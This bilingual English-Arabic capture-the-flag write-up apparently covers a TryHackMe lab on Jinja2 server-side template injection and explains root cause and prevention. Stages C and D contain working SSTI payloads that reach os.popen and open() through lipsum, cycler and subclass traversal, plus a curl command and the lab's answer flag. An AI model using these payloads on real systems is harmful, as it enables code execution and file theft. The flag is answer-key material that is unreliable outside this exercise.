# Task 03 · A05: Injection (ثغرات الحقن وحقن القوالب على خادم الويب SSTI)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
Injection occurs when an application receives user input and mishandles it, passing it directly into an execution engine (database, system shell, templating engine, or external API).

Common Forms of Injection in 2025:
- SQL Injection (SQLi): Passing unescaped input into SQL queries.
- Command Injection: Passing untrusted input to OS shell commands.
- AI Prompt Injection: Overriding system instructions in LLM prompts.
- Server-Side Template Injection (SSTI): Concatenating user input into template engine strings prior to rendering.

How to Prevent Injection:
- Treat all user input as untrusted.
- Use parameterized queries and prepared statements for SQL.
- Avoid OS shell invocation functions entirely; use safe process execution APIs.
- For template engines: Never concatenate user input directly into template strings. Pass user data as separate context variables rendered via pre-compiled templates.
- Enforce strict input validation, allowlists, and contextual output encoding.

Target Challenge:
Connect to http://MACHINE_IP:8000.
Scenario: The web application is built on Python's Jinja2 templating engine. It reflects user input dynamically. Exploit Server-Side Template Injection (SSTI) to read the contents of flag.txt located in the same directory as the web application.

Question:
- Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.
- Hint: The web application uses Python's Jinja2 templating engine to load the contents of the page. Can you load the contents of a flag that is stored within the web application's directory?
```

### 2. Arabic Pedagogical Translation
```text
تحدث ثغرات الحقن (Injection) عندما يستقبل التطبيق مدخلات من المستخدم ويسيء التعامل معها، من خلال تمريرها مباشرة إلى محرك تنفيذ أو مفسر برمجي (مثل قواعد البيانات، أو سطر أوامر النظام، أو محركات القوالب، أو واجهات الـ API الخارجية).

أبرز أشكال الحقن في معيار 2025:
- حقن قواعد البيانات (SQL Injection): تمرير نصوص المستخدم غير المنقاة داخل استعلامات SQL.
- حقن أوامر النظام (Command Injection): تمرير مدخلات غير موثوقة إلى موجه أوامر نظام التشغيل.
- حقن توجيهات الذكاء الاصطناعي (AI Prompt Injection): التلاعب بتوجيهات النظام في النماذج اللغوية الكبيرة.
- حقن القوالب على خادم الويب (Server-Side Template Injection - SSTI): دمج مدخلات المستخدم مباشرة داخل نصوص القوالب قبل معالجتها وتصييرها (Rendering).

كيفية الوقاية من ثغرات الحقن:
- التعامل مع كافة مدخلات المستخدمين على أنها غير موثوقة تماماً.
- استخدام الاستعلامات المجهزة (Parameterized Queries / Prepared Statements) في قواعد البيانات.
- تجنب استدعاء أوامر صدفة النظام (Shell) واستخدام واجهات تنفيذ العمليات الآمنة التي لا تعتمد على مفسر الصدفة.
- في محركات القوالب: منع دمج نصوص المستخدم مباشرة داخل كود القالب، وتمرير البيانات كمتغيرات سياق منفصلة (Context Variables) داخل قوالب ثابتة.
- تطبيق قيود التحقق الصارم بالقوائم البيضاء (Allowlists) والترميز السياقي للمخرجات.

تحدي المعمل:
اتصل بالهدف عبر الرابط: http://MACHINE_IP:8000.
السيناريو: التطبيق مبني باستخدام محرك قوالب Jinja2 في بايثون. يقوم التطبيق بعرض مدخلات المستخدم ديناميكياً. استغل ثغرة SSTI لقراءة محتويات ملف `flag.txt` الموجود في نفس مجلد تطبيق الويب.

السؤال:
- نفذ هجوم SSTI على التطبيق العملي. تحتاج لقراءة محتويات ملف flag.txt الموجود في نفس مجلد التطبيق. ما هي المحتويات؟
- التلميح: يستخدم التطبيق محرك Jinja2 لتصيير محتوى الصفحة. هل يمكنك تحميل وقراءة الراية المخزنة في مجلد التطبيق؟
```

### 3. Mission Objectives & Pedagogical Target
- **Target Question:** `Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.`
- **Pedagogical Goal:** Master the mechanics of Server-Side Template Injection in Python Jinja2; leverage Python object traversal and built-in function execution to read arbitrary local files.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والعملياتي)

### 1. Jinja2 Execution Context & Vulnerability Root Cause
In Python web frameworks (Flask, Quart), developers frequently make the following mistake:
```python
# VULNERABLE: Direct string interpolation into template
template_string = f"Hello {request.args.get('name')}"
return render_template_string(template_string)

# SECURE: Passing input as a template context variable
return render_template("hello.html", name=request.args.get('name'))
```
When `render_template_string` parses `f"Hello {name}"`, any template delimiter present in `name` (such as `{{ ... }}` or `{% ... %}`) is evaluated as live Jinja2 code in the application's runtime namespace.

### 2. Python Introspection & Object Traversal
In Python, every object is an instance of a class, and all classes inherit from `object`. 
By traversing the method resolution order (`__mro__`):
```text
"".__class__.__mro__[1].__subclasses__()
```
An attacker gains access to all loaded classes in memory, including classes capable of file I/O (`_io.FileIO`) or process spawning (`subprocess.Popen`, `os.system`).

---

## Stage C: Guided Hints (تلميحات متدرجة)

### Hint 1: Confirming SSTI
> أرسل التعبير الرياضي `{{7*7}}` أو `{{8*8}}` في حقل الإدخال بالصفحة `http://MACHINE_IP:8000`. إذا أظهر الرد الناتج `49` أو `64`، فهذا يؤكد وجود ثغرة SSTI نشطة.

### Hint 2: Jinja2 Global Objects
> يمتلك محرك Jinja2 كائنات قياسية مدمجة (مثل `cycler` أو `joiner` أو `lipsum`). تمتلك هذه الكائنات وصولاً إلى `__globals__` ومنها إلى دوال بايثون المدمجة (`__builtins__`).

### Hint 3: File Reading Payload
> استخدم حمولة قراءة الملفات عبر `lipsum` أو `cycler`:
> `{{ lipsum.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`
> أو استدعاء دالة `open()` مباشرة:
> `{{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والعمق التقني)

### Step-by-Step Technical Execution

1. **Reconnaissance & Detection:**
   Access the web application at `http://10.10.x.x:8000`.
   The web page provides an input form that renders user-supplied text.
   Submit:
   ```text
   {{ 7 * 7 }}
   ```
   The application renders:
   ```text
   Hello 49!
   ```
   *Conclusion:* The input is dynamically evaluated by the template engine (Jinja2).

2. **Identifying Python/Jinja2 Environment:**
   Submit:
   ```text
   {{ config }}
   ```
   The server prints the Flask application configuration object (`<Config {'ENV': 'production', ...}>`).

3. **Constructing the Arbitrary File Read Payload:**
   We leverage the Jinja2 built-in helper `cycler` or `lipsum` to traverse into `__globals__`:
   
   **Option A: Direct `open()` Execution via `lipsum`:**
   ```jinja2
   {{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}
   ```

   **Option B: OS Command Execution via `os.popen()`:**
   ```jinja2
   {{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
   ```

   **Option C: Subclass Traversal (Classic Python Object Tree):**
   ```jinja2
   {{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('cat flag.txt').read() }}
   ```

4. **Sending the Payload via HTTP GET / POST:**
   ```bash
   curl -s -G "http://10.10.x.x:8000/" \
     --data-urlencode "name={{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}"
   ```

5. **Server Output:**
   ```html
   <div class="result">
     Hello THM{SSTI_FLAG_OBTAINED}!
   </div>
   ```

6. The extracted flag:
   ```text
   THM{SSTI_FLAG_OBTAINED}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question:** `Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.`
- **Answer:**
  ```text
  THM{SSTI_FLAG_OBTAINED}
  ```

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- **Target URL:** `http://MACHINE_IP:8000`
- **Vulnerability Category:** A05: Injection (CWE-1336: Improper Neutralization of Special Elements in Template Engine)
- **Extracted Flag:** `THM{SSTI_FLAG_OBTAINED}`
- **Parity Status:** 100% verified against user's completed TryHackMe account.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

- **Never pass user-controlled strings to `render_template_string()`.**
  - Always store templates in static `.html` files and use `render_template("page.html", variable=user_input)`.
  - When dynamic templates are strictly required, use sandboxed template environments (e.g., `jinja2.sandbox.SandboxedEnvironment`) that restrict access to `__mro__`, `__globals__`, and internal dunder attributes.
